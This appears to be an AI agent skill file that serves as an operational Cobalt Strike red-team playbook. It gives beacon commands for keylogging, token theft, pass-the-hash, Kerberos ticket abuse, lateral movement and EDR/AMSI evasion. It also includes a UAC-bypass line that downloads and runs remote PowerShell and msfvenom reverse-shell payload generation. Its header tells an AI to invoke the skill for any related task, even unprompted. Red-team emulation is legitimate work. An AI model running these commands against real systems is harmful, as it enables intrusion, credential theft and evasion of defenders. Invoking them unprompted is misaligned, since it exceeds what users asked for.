---
name: cobalt-strike
description: Cobalt Strike red team operations guide. Use this skill whenever the user mentions Cobalt Strike, C2 infrastructure, beacon operations, post-exploitation, lateral movement, Windows/Linux penetration testing, or adversary emulation. This covers listeners, payloads, beacon commands, opsec considerations, evasion techniques, and custom implants. Make sure to use this skill for any Cobalt Strike related tasks, even if the user doesn't explicitly name it.
---

# Cobalt Strike Operations

A comprehensive guide for Cobalt Strike red team operations, covering C2 setup, payload generation, beacon management, lateral movement, and operational security.

## C2 Listeners

### Standard C2 Listeners

Configure listeners to establish command and control channels:

1. Navigate to `Listeners -> Add/Edit`
2. Select the communication protocol (HTTP, DNS, SMB, etc.)
3. Configure the beacon type and connection parameters
4. Set appropriate network interfaces and ports

### Peer-to-Peer Listeners

P2P listeners allow beacons to communicate through other beacons rather than directly to C2:

**TCP Beacon:**
- Sets a listener on the selected port
- Connect from another beacon: `connect <ip> <port>`

**SMB Beacon:**
- Listens on a named pipe
- Connect from another beacon: `link [target] [pipe]`

## Payload Generation

### Generate Payloads in Files

Access `Attacks -> Packages` to create various payload types:

| Payload Type | Use Case | Notes |
|--------------|----------|-------|
| HTMLApplication | HTA files | Browser-based delivery |
| MS Office Macro | Office documents | Requires macro execution |
| Windows Executable | .exe, .dll, service | Standard staged payload |
| Windows Executable (S) | Stageless .exe, .dll | **Preferred** - fewer IoCs |

**Recommendation:** Use stageless payloads when possible. They don't download a second stage from C2, reducing network-based detection.

### Scripted Web Delivery

For web-based payload delivery:

1. Navigate to `Attacks -> Web Drive-by -> Scripted Web Delivery (S)`
2. Select output format: bitsadmin, exe, powershell, or python
3. Configure the listener and hosting parameters

### Host Existing Files

To host pre-existing payloads:

1. Navigate to `Attacks -> Web Drive-by -> Host File`
2. Select the file to host
3. Configure web server settings

## Beacon Operations

### Process Execution

```bash
# Execute .NET assemblies
execute-assembly </path/to/executable.exe>
# Note: For assemblies >1MB, modify 'tasks_max_size' in malleable profile

# Spawn with specific credentials
spawnas [domain\username] [password] [listener]
# Execute from a directory with read access: cd C:\
```

### Reconnaissance

```bash
# Screenshots
printscreen    # Single screenshot via PrintScr method
screenshot     # Single screenshot
screenwatch    # Periodic desktop screenshots
# View screenshots: View -> Screenshots

# Keylogger
keylogger [pid] [x86|x64]
# View keystrokes: View -> Keystrokes

# Port scanning
portscan [targets] [ports] [arp|icmp|none] [max connections]
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections]  # Inject into process
```

### PowerShell Operations

```bash
# Import modules
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1

# Execute commands (uses highest PS version - not opsec friendly)
powershell <command>

# Opsec-friendly execution (injects into sacrificial process)
powerpick <cmdlet> <args>
powerpick Invoke-PrivescAudit | fl

# Inject into specific process
psinject <pid> <arch> <commandlet> <arguments>
```

### Token Operations

```bash
# Create token with credentials
make_token [DOMAIN\user] [password]
# Access network resources: ls \\computer_name\c$
# Stop using token: rev2self
# Note: Generates Event 4624 with Logon Type 9

# Steal token from process
steal_token [pid]
# Useful for network actions, not local
# Access resources: ls \\computer_name\c$
# Stop using token: rev2self

# Token store (per-beacon token management)
token-store steal <pid>
token-store steal-and-use <pid>
token-store show
token-store use <id>
token-store remove <id>
token-store remove-all
```

### UAC Bypass

```bash
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://<ip>:<port>/b'))"
```

### Process Injection

```bash
# Inject beacon into process
inject [pid] [x64|x86] [listener]
# OpSec: Avoid cross-platform injection (x86 <-> x64) unless necessary

# Pass the hash
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]
# Requires local admin, patches LSASS memory, may fail with PPL

# Pass the hash via Mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
steal_token <pid>  # Steal token from spawned process
```

### Kerberos Operations

```bash
# Request TGT
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec

# Create logon session for ticket
make_token <domain>\<username> DummyPass

# Use ticket
kerberos_ticket_use C:\path\to\ticket.kirbi

# Create network-only session with ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
steal_token <pid>

# Triage and dump tickets
execute-assembly C:\path\Rubeus.exe triage
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[base64-ticket]
steal_token <pid>
```

## Lateral Movement

### Jump Command

```bash
jump [method] [target] [listener]
```

**Available methods:**

| Method | Architecture | Description |
|--------|--------------|-------------|
| psexec | x86 | Service EXE artifact via SCM |
| psexec64 | x64 | Service EXE artifact via SCM |
| psexec_psh | x86 | PowerShell one-liner via service |
| winrm | x86 | PowerShell via WinRM |
| winrm64 | x64 | PowerShell via WinRM |
| wmi_msbuild | x64 | **Preferred** - WMI with msbuild inline C# (opsec) |

**Recommendation:** Use `wmi_msbuild` for better operational security.

### Remote Execution

```bash
remote-exec [method] [target] [command]
# Note: Does not return output
```

**Methods:** psexec, winrm, wmi

### WMI Beacon Execution

```bash
upload C:\Payloads\beacon-smb.exe
remote-exec wmi srv-1 C:\Windows\beacon-smb.exe
```

## Metasploit Integration

### Pass Session to Metasploit (Listener)

**On Metasploit host:**
```
msf6 > use exploit/multi/handler
msf6 > set payload windows/meterpreter/reverse_http
msf6 > set LHOST <ip>
msf6 > set LPORT <port>
msf6 > exploit -j
```

**On Cobalt Strike:**
1. Listeners -> Add, set Payload to Foreign HTTP
2. Configure Host and Port
3. In beacon: `spawn metasploit`

### Pass Session to Metasploit (Shellcode)

**On Metasploit host:**
```
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
```

**On Cobalt Strike:**
```
shinject <pid> x64 C:\Payloads\msf.bin
```

### Pass Metasploit Session to Cobalt Strike

1. Generate stageless beacon shellcode: `Attacks -> Packages -> Windows Executable (S)`
2. Select listener, Raw output, x64 payload
3. In Metasploit: `post/windows/manage/shellcode_inject`

## Pivoting

### SOCKS Proxy

```bash
socks 1080
# Opens SOCKS proxy on teamserver port 1080
```

### SSH Connection

```bash
ssh 10.10.17.12:22 username password
```

## Operational Security

### Execute-Assembly Alternatives

The `execute-assembly` command uses remote process injection, which is noisy. Consider alternatives:

- **InlineExecute-Assembly:** https://github.com/anthemtotheego/InlineExecute-Assembly
- **inject-assembly:** https://github.com/kyleavery/inject-assembly
- **BOF.NET:** https://github.com/CCob/BOF.NET

Use the HelpColor aggressor script to identify command risk levels:
- Green: BOFs (stealthy)
- Yellow: Fork & Run
- Red: Process execution/injection (noisy)

### Process Parentage

Maintain legitimate parent-child relationships to avoid detection:

```bash
# Default: rundll32.exe (suspicious)
# Better: svchost.exe
spawnto x86 svchost.exe
spawnto x64 svchost.exe
```

Configure in malleable profile with `spawnto_x86` and `spawnto_x64`.

### Malleable C2 Profile Customization

Modify these settings to reduce detection:

```c
# Avoid default pipe names (msagent_####, status_####)
set pipename "<custom_name>";
set ssh_pipename "<custom_name>";

# Process injection behavior
process-inject {
    # Configure injection APIs
}

# Post-exploitation behavior
post-ex {
    # Configure fork and run
}

# Memory and network
stage {
    # Memory footprint, DLL content
}

# Sleep configuration
sleep {
    # Sleep time, mask function
}
```

### Function Hook Bypass

EDRs use function hooking for detection. Bypass options:

```bash
# Set syscall method
syscall-method None      # Use syscalls directly
syscall-method Direct    # Use Nt* functions
syscall-method Indirect  # Jump over Nt* functions
```

Additional tools:
- **unhook-bof:** https://github.com/Cobalt-Strike/unhook-bof
- **Hook detection:** https://github.com/Mr-Un1k0d3r/EDRs
- **Hook detection:** https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector

### AV/AMSI Bypass

#### Artifact Kit

1. Locate templates: `/opt/cobaltstrike/artifact-kit/src-common`
2. Test with ThreatCheck: https://github.com/rasta-mouse/ThreatCheck
3. Modify detected strings in source code
4. Rebuild: `./build.sh`
5. Copy to client: `dist-pipe/` -> `C:\Tools\cobaltstrike\ArtifactKit`
6. Load aggressor script: `dist-pipe\artifact.cna`

#### Resource Kit

1. Locate templates: `C:\Tools\cobaltstrike\ResourceKit`
2. Test with ThreatCheck:
   ```
   .\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
   ```
3. Modify detected lines
4. Load aggressor script: `ResourceKit\resources.cna`

### Event Monitoring

Check these events to understand the environment:

| Event ID | Description |
|----------|-------------|
| 4624 | Account logon (check Logon Type 9 for make_token) |
| 4625 | Failed logon attempts |
| 4648 | Explicit credentials used |
| 12, 13 | System shutdown/startup/sleep |

Use Seatbelt for reconnaissance:
```
execute-assembly C:\path\Seatbelt.exe -group=system
execute-assembly C:\path\Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents
```

### Guardrails

Configure Guardrails to prevent risky commands:
- Block `make_token`, `jump`, `remote-exec` for lateral movement
- Block privilege escalation commands
- Use CheckPlease for pre-execution checks: https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks

### Kerberos Encryption

Use AES encryption instead of RC4 for Kerberos tickets:
```
execute-assembly C:\path\Rubeus.exe asktgt /user:<user> /domain:<domain> /aes256:<key>
```

RC4 is less secure and may trigger detection in modern environments.

## Custom Implants

### Linux Beacons

Custom Linux beacons require:

1. **HTTP/S Protocol:** Implement Cobalt Strike Team Server protocol
2. **Malleable Profile:** Match URIs, headers, metadata crypto
3. **Task Handlers:** Implement expected task IDs:
   - `sleep`, `cd`, `pwd`, `shell`, `ls`, `upload`, `download`, `exit`
4. **BOF Support:** Use ELFLoader for modular execution: https://github.com/trustedsec/ELFLoader
5. **SOCKS Handler:** Implement `socks <port>` for pivoting

### Aggressor Scripts

Create `.cna` scripts to wrap payload generation for custom beacons, allowing operators to select listeners and produce ELF payloads from the GUI.

## References

- Cobalt Strike Linux Beacon: https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon
- TrustedSec ELFLoader: https://github.com/trustedsec/ELFLoader
- Outflank nix BOF template: https://github.com/outflanknl/nix_bof_template
- Unit42 CS metadata encryption: https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/
- SANS ISC CS traffic: https://isc.sans.edu/diary/27968
- cs-decrypt-metadata-py: https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/
- SentinelOne CobaltStrikeParser: https://github.com/Sentinel-One/CobaltStrikeParser
